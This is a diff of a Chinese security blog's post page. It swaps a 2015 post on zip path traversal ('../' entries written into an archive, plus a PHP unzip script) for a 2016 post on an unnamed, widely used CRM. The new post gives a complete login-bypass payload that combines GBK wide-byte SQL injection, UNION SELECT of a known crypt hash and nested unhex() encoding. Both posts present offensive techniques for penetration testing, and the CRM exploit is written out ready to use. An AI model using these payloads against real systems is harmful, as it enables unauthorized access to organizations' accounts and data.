@@ -4,15 +4,12 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>上传之万恶的zip | FreeV&#39;s Blog</title>
+    <title>一次审计中遇到的问题 | FreeV&#39;s Blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
     
     <meta name="author" content="FreeV">
     
-    <meta name="description" content="0x00 zip文件结构1,找一张图片命令xxx11.jpg然后压缩
-2,用二进制文件编辑器打开，我这里用的是UE，ctrl+f查找xxx替换成../，(注意有两处)
-3,然后解压，你会发现11.jpg文件被解压到了文件目录的上一层
-0X01 利用如果我们在渗透过程中遇到zip上传，而且解压，但是解">
+    <meta name="description" itemprop="description" content="某crm登陆绕过">
     
     
     
@@ -70,7 +67,7 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2015/12/16/上传之万恶的zip/" title="上传之万恶的zip" itemprop="url">上传之万恶的zip</a>
+      <a href="/2016/12/06/一次审计中遇到的问题/" title="一次审计中遇到的问题" itemprop="url">一次审计中遇到的问题</a>
   </h1>
   
   <p class="article-author">By
@@ -81,65 +78,26 @@
 			本文总阅读量<span id="busuanzi_value_page_pv"></span>次
 		</span>
   <p class="article-time">
-    <time datetime="2015-12-16T03:46:22.000Z" itemprop="datePublished">2015-12-16</time>
-    更新日期:<time datetime="2016-09-02T06:16:57.777Z" itemprop="dateModified">2016-09-02</time>
+    <time datetime="2016-12-06T07:08:36.000Z" itemprop="datePublished">2016-12-06</time>
+    更新日期:<time datetime="2016-12-06T08:25:47.960Z" itemprop="dateModified">2016-12-06</time>
     
   </p>
 </header>
 	<div class="article-content">
 		
 		
-		<h2 id="0x00_zip_u6587_u4EF6_u7ED3_u6784"><a href="#0x00_zip_u6587_u4EF6_u7ED3_u6784" class="headerlink" title="0x00 zip文件结构"></a>0x00 zip文件结构</h2><p>1,找一张图片命令xxx11.jpg然后压缩</p>
-<p>2,用二进制文件编辑器打开，我这里用的是UE，ctrl+f查找xxx替换成../，(注意有两处)</p>
-<p>3,然后解压，你会发现11.jpg文件被解压到了文件目录的上一层</p>
-<h2 id="0X01__u5229_u7528"><a href="#0X01__u5229_u7528" class="headerlink" title="0X01 利用"></a>0X01 利用</h2><p>如果我们在渗透过程中遇到zip上传，而且解压，但是解压之后的文件目录没有php的执行权限，或者php文件被自动删除。<br>那么zip大法就能搞定了，附上解压代码。</p>
-<pre><code>&lt;?php 
-    header(&quot;Content-type:text/html;charset=utf-8&quot;);
-    function get_zip($filename,$path=null){
-
-        $i=0;
-        if(!file_exists($filename))
-            die (&quot;&quot;);
-        $filename=iconv(&apos;utf-8&apos;,&apos;gb2312&apos;,$filename);
-        $path=iconv(&apos;utf-8&apos;,&apos;gb2312&apos;,$path);
-        $resource = zip_open($filename);
-        while($dir_res=zip_read($resource)){
-
-            if (zip_entry_open($resource,$dir_res)) {
-                $res_name= zip_entry_name($dir_res);
-
-                $file_name = $path.$res_name;
-                echo $file_name;
-                $file_path = substr($file_name,0,strrpos($file_name, &quot;/&quot;));
-                if(!is_dir($file_path)){
-                    mkdir($file_path,0777,true);
-                }
-                if(!is_dir($file_name)){
-                    $file_size=zip_entry_filesize($dir_res);
-                    if($file_size&lt;(1024*1024*6)){
-                        $file_content = zip_entry_read($dir_res,$file_size);
-                        file_put_contents($file_name,$file_content);
-                    }else{
-                        echo &quot;&lt;p&gt; &quot;.$i++.&quot; ， -&gt; &quot;.iconv(&quot;gb2312&quot;,&quot;utf-8&quot;,$file_name).&quot; &lt;/p&gt;&quot;;
-                    }
-
-                }
-            }
-
-        }
-
-    }
-    get_zip(&quot;11.zip&quot;,&apos;temp/&apos;);
-?&gt;
-</code></pre><h2 id="0X03__u6269_u5C55"><a href="#0X03__u6269_u5C55" class="headerlink" title="0X03 扩展"></a>0X03 扩展</h2><p>如果我们有权限，也可以在解压目录中创建目录<br>原理相同把上述的xxx改成xx/，那么就会在文件目录下创建一个xx的目录，图片的路径就变成了temp/xx/11.jpg</p>
-<pre><code>Author:FreeV
-</code></pre>  
+		<h1 id="0x01__u67D0crm"><a href="#0x01__u67D0crm" class="headerlink" title="0x01 某crm"></a>0x01 某crm</h1><p>这个漏洞之前提交过，厂商不再关注了。就跟大家分享一下：因为现在很多企业，学校都再用，就不说厂商名字了。<br>代码是混淆过的，不过没关系，把eval 换成echo。运行 也会echo出源码。默认mysql链接字符集是gbk这很关键。直接导致宽字节注入。<br>密码验证函数是crypt。crypt是php自带的函数。自行百度吧。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function logincheck($username,$password)							&#123;</span><br><span class="line">	global $db,$表前缀;</span><br><span class="line">	$SQL		= "SELECT * FROM ".$表前缀."user WHERE USER_ID = '$username'";</span><br><span class="line">	$rs			= $db-&gt;Execute($SQL);</span><br><span class="line">	$rs_a		= $rs-&gt;GetArray();</span><br><span class="line">	$USER_ID	= $rs_a[0]['USER_ID'];</span><br><span class="line">	$PASSWORDTEXT = $rs_a[0]['PASSWORD'];</span><br><span class="line">	//print crypt('', $PASSWORDTEXT) == $PASSWORDTEXT;</span><br><span class="line">	//print_R($password);print_R($PASSWORDTEXT);exit;</span><br><span class="line">	if($USER_ID!="")												&#123;</span><br><span class="line">		if(crypt($password,$PASSWORDTEXT) == $PASSWORDTEXT)			&#123;</span><br><span class="line">			//密码正确</span><br><span class="line">			return $rs_a;</span><br><span class="line">			exit;</span><br><span class="line">		&#125;</span><br><span class="line">		else	&#123;</span><br><span class="line">			//密码错误</span><br><span class="line">			//print_R($password);print_R($username);exit;</span><br><span class="line">			echo "&lt;META HTTP-EQUIV=REFRESH CONTENT='0;URL=notchecked.php'&gt;\n";</span><br><span class="line">			exit;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else	&#123;</span><br><span class="line">		//用户名不存在</span><br><span class="line">		//print_R($password);print_R($_POST);exit;</span><br><span class="line">		echo "&lt;META HTTP-EQUIV=REFRESH CONTENT='0;URL=notchecked.php'&gt;\n";</span><br><span class="line">		exit;</span><br><span class="line">	&#125;</span><br><span class="line">	exit;</span><br></pre></td></tr></table></figure></p>
+<p>这里宽字节注入肯定没问题了，盲注，报错注入都是可以得。我试了似免登录还真绕过了，crypt函数验证密码，union select 可能帮助我们控制PASSWORDTEXT，并且password也是我们自己提交了.我们自己构造一个：<br>crypt(‘1’,’11b0WGZJEBWiw’)==’11b0WGZJEBWiw’)<br>提交：<br><code>username=1%df&#39; UNION SELECT 1,(select user_id from user limit 1),3,4,5,&#39;11b0WGZJEBWiw&#39;,7,8,9,10,11,12,13,14,15,16,17#&amp;password=1&amp;登录=登录</code><br>这时候会报错，因为后面的单引号被转移了没办法绕过，于是我一直在想怎么绕过，最后发现了这个方法用unhex，不过当unhex的参数是字母时还需要我们用单引号，那我们就再用一层unhex，说到这大家可能懂了<br><code>Select concat(unhex(313162305747),unhex(concat(unhex(35),unhex(41),unhex(34),unhex(41))),unhex(4542576977))</code><br>就是 11b0WGZJEBWiw<br>最后构造pl<br><code>username=1%df&#39; UNION SELECT 1,(select user_id from user limit 1),3,4,5,concat(unhex(313162305747),unhex(concat(unhex(35),unhex(41),unhex(34),unhex(41))),unhex(4542576977)),7,8,9,10,11,12,13,14,15,16,17#&amp;password=1&amp;登录=登录</code><br>成功绕过。</p>
+<h1 id="0x02__u603B_u7ED3"><a href="#0x02__u603B_u7ED3" class="headerlink" title="0x02 总结"></a>0x02 总结</h1><pre><code>其实方法还有跟多，还是要看程序过滤哪些函数比如：char()函数，unhex()函数与concat()结合使用。
+</code></pre><p>如：<br><code>select concat(char(90),char(90)) : ZZ
+select</code></p>
+  
 	</div>
 		<footer class="article-footer clearfix">
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/渗透技巧/">渗透技巧</a>
+  <span></span> <a href="/tags/代码审计/">代码审计</a>
   </div>
 
 
@@ -147,7 +105,7 @@
 
 <div class="article-share" id="share">
 
-  <div data-url="http://yoursite.com/2015/12/16/上传之万恶的zip/" data-title="上传之万恶的zip | FreeV&#39;s Blog" data-tsina="null" class="share clearfix">
+  <div data-url="http://yoursite.com/2016/12/06/一次审计中遇到的问题/" data-title="一次审计中遇到的问题 | FreeV&#39;s Blog" data-tsina="null" class="share clearfix">
   </div>
 
 </div>
@@ -156,19 +114,11 @@
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2016/01/30/一个php木马引发的xxoo/" title="一个php木马引发的xxoo">
-  <strong>PREVIOUS:</strong><br/>
-  <span>
-  一个php木马引发的xxoo</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/2015/12/11/php高级图片隐藏马/"  title="php高级图片隐藏马">
+<a href="/2016/12/06/社工实战/"  title="社工实战">
  <strong>NEXT:</strong><br/> 
- <span>php高级图片隐藏马
+ <span>社工实战
 </span>
 </a>
 </div>
@@ -185,7 +135,7 @@
 
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
-  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00_zip_u6587_u4EF6_u7ED3_u6784"><span class="toc-number">1.</span> <span class="toc-text">0x00 zip文件结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X01__u5229_u7528"><span class="toc-number">2.</span> <span class="toc-text">0X01 利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X03__u6269_u5C55"><span class="toc-number">3.</span> <span class="toc-text">0X03 扩展</span></a></li></ol>
+  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01__u67D0crm"><span class="toc-number">1.</span> <span class="toc-text">0x01 某crm</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02__u603B_u7ED3"><span class="toc-number">2.</span> <span class="toc-text">0x02 总结</span></a></li></ol>
   </div>
 
 <div id="asidepart">
